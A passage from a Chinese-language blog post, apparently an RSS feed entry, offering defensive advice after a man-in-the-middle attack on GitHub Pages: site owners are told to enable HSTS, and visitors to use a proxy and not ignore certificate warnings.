<p>作为站长，首先可以确定的是，并没有什么用户无痛(无需用户进行任何操作和设置)的办法来绕过这类针对性的MITM攻击，如果需要保护用户的隐私，建议开启域名的HSTS策略，这样浏览器检查到证书错误时的警告页面上就不会显示 <code>忽略警告</code> 相关按钮，防止不懂的用户忽略安全警告进行访问，避免隐私数据泄露</p>
<p>当然，像昨天那种针对 GitHub Pages 的攻击只会导致用户无法访问，并不会带来隐私泄露，因为github pages是提供静态网页托管，根本不需要用户输入隐私数据</p>
<p>作为访客，因为这种中间人攻击肯定发生在路由路径的某一个节点处，所以我们可以使用代理绕过这个恶意节点，这应该是目前最简单最好用的方法了</p>
<p>同时，当我们在浏览器中发现此类警告，除非是对证书内容充分信任(如自己为了调试而签发的证书)，否则不要忽视任何此类的警告而强行访问，否则隐私信息泄露在所难免</p>
<blockquote>
<p>因为我自己访问国外网站一直是使用代理，所以本次事件对我的影响几乎等于零
因为不受影响，所以也很难在第一时间发现这类事件，后续需要准备一个监控系统了</p>
</blockquote>
]]></description></item></channel></rss>